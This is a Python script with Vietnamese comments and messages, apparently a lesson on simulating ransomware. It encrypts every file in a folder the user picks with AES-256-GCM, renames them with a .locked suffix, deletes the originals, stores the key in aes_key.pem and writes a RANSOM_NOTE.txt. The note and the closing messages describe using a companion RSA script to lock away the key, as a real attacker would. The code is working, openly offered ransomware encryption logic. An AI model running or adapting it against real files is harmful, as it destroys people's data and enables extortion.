"""
encrypt_AES.py  —  Ma hoa thu muc (AES-256-GCM)
═══════════════════════════════════════════════════════
Logic:
  1. Chon thu muc can ma hoa
  2. Sinh ngau nhien AES-256 key
  3. Ma hoa tung file trong thu muc  → them duoi .locked
  4. Luu AES key thanh file 'aes_key.pem' (khoa tran)
  5. Tao RANSOM_NOTE.txt
"""

import os
import sys
import base64
import datetime
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("[!] Cai dat thu vien: pip install cryptography")
    sys.exit(1)

MAGIC = b"AESCRYPT"
W     = 60

# ── DIRECTORY BROWSER ─────────────────────────────

def _ls(path):
    try: entries = os.listdir(path)
    except PermissionError: return [], []
    dirs  = sorted([e for e in entries if os.path.isdir(os.path.join(path,e))  and not e.startswith('.')], key=str.lower)
    return dirs, []

def browse_directory(title: str, start: str = None):
    cur = os.path.abspath(start or os.getcwd())
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print("+" + "-"*W + "+")
        print(f"|  {title:<{W-2}}|")
        print("+" + "-"*W + "+")
        disp = cur if len(cur) <= W-12 else "..."+cur[-(W-15):]
        print(f"|  Dang dung tai: {disp:<{W-12}}|")
        print("+" + "-"*W + "+")

        dirs, _ = _ls(cur)
        items = []
        parent = os.path.dirname(cur)
        if parent != cur:
            items.append(("[DIR]  .. (Quay lai thu muc cha)", parent))
        for d in dirs:
            full = os.path.join(cur, d)
            items.append((f"[DIR]  {d}/", full))

        if not items:
            print(f"|  {'(Thu muc nay trong)':<{W-2}}|")
        else:
            for i,(label,_) in enumerate(items,1):
                line = f"  {i:>3}.  {label}"
                if len(line)>W: line=line[:W-3]+"..."
                print(f"|{line:<{W}}|")

        print("+" + "-"*W + "+")
        print(f"|  {'So=di vao | s=CHON THU MUC NAY | q=huy':<{W-2}}|")
        print("+" + "-"*W + "+")
        c = input("\n  >>> ").strip().lower()

        if c == "q": return None
        if c == "s": return cur
        if c.isdigit():
            idx = int(c)
            if 1 <= idx <= len(items): cur = items[idx-1][1]
            else: input("  [!] So khong hop le. Enter de tiep...")
        else: input("  [!] Nhap 's' de chon, hoac so de di vao, hoac 'q' de huy...")

# ── CORE FUNCTIONS ─────────────────────────────

def save_raw_key_as_pem(aes_key: bytes, out_path: str):
    b64 = base64.b64encode(aes_key).decode('ascii')
    pem_content = f"-----BEGIN RAW AES KEY-----\n{b64}\n-----END RAW AES KEY-----\n"
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(pem_content)

def encrypt_file_inplace(aes_key: bytes, file_path: Path) -> bool:
    try:
        with open(file_path, "rb") as f:
            plaintext = f.read()

        nonce = os.urandom(12)
        aesgcm = AESGCM(aes_key)
        ct_tag = aesgcm.encrypt(nonce, plaintext, None)

        locked_path = file_path.with_suffix(file_path.suffix + ".locked")
        with open(locked_path, "wb") as f:
            f.write(MAGIC + nonce + ct_tag[-16:] + ct_tag[:-16])

        os.remove(file_path)
        return True
    except Exception as e:
        print(f"  [!] Loi tai {file_path.name}: {e}")
        return False

def create_ransom_note(sandbox_dir: str, count: int):
    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    note = f"""
╔══════════════════════════════════════════════════════════╗
║                  !!! YOUR FILES ARE LOCKED !!!           ║
╠══════════════════════════════════════════════════════════╣
║  Tất cả {count} file trong thư mục này đã bị mã hóa.      ║
║                                                          ║
║  File cua ban duoc khoa bang AES-256-GCM.                ║
║  Khoa AES da duoc luu tai file: aes_key.pem              ║
║                                                          ║
║  [TRONG THUC TE]: Hacker se dung encrypt_RSA.py de       ║
║  ma hoa file aes_key.pem nay roi xoa file goc di.        ║
║                                                          ║
║  Thời gian mã hóa : {timestamp}               ║
║  Số file bị khóa  : {count:<3} file(s)                        ║
╚══════════════════════════════════════════════════════════╝
"""
    note_path = os.path.join(sandbox_dir, "RANSOM_NOTE.txt")
    with open(note_path, "w", encoding="utf-8") as f:
        f.write(note)
    return note_path

# ── MAIN ─────────────────────────────────────────────

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print("=" * W)
    print("       BUOC 1: MA HOA THU MUC BANG AES-256")
    print("=" * W)

    print("\n[BUOC 1] Chon thu muc can ma hoa")
    input("  Nhan Enter de mo trinh duyet thu muc...")
    sandbox_dir = browse_directory("CHON THU MUC CAN MA HOA (Nhan 's' de xac nhan)")

    if not sandbox_dir:
        print("[X] Da huy.")
        return

    files_to_encrypt = [
        f for f in Path(sandbox_dir).rglob('*')
        if f.is_file() and f.suffix != ".locked" and f.name != "RANSOM_NOTE.txt" and f.name != "aes_key.pem"
    ]

    if not files_to_encrypt:
        print(f"\n[!] Khong co file nao de ma hoa trong: {sandbox_dir}")
        return

    print(f"\n  Tim thay {len(files_to_encrypt)} file(s).")
    confirm = input("  Nhap 'ENCRYPT' de xac nhan ma hoa: ").strip()
    if confirm != "ENCRYPT":
        print("[--] Da huy.")
        return

    print(f"\n[BUOC 2] Dang sinh AES-256 key ngau nhien...")
    aes_key = AESGCM.generate_key(bit_length=256)

    print(f"[BUOC 3] Dang ma hoa {len(files_to_encrypt)} file(s)...")
    count = 0
    for fp in files_to_encrypt:
        if encrypt_file_inplace(aes_key, fp):
            print(f"  [OK] {fp.name} → .locked")
            count += 1

    print(f"\n[BUOC 4] Luu file AES key (aes_key.pem)...")
    key_pem_path = os.path.join(sandbox_dir, "aes_key.pem")
    save_raw_key_as_pem(aes_key, key_pem_path)
    print(f"  [OK] Da luu tai: {key_pem_path}")

    aes_key = b'\x00' * len(aes_key)
    del aes_key

    note_path = create_ransom_note(sandbox_dir, count)
    print(f"[BUOC 5] Da tao {note_path}")

    print("\n" + "=" * W)
    print("  HOAN TAT MA HOA AES!")
    print("  De mo phong Ransomware, hay chay file encrypt_RSA.py")
    print("  va chon ma hoa file aes_key.pem nay lai.")
    print("=" * W)

if __name__ == "__main__":
    main()
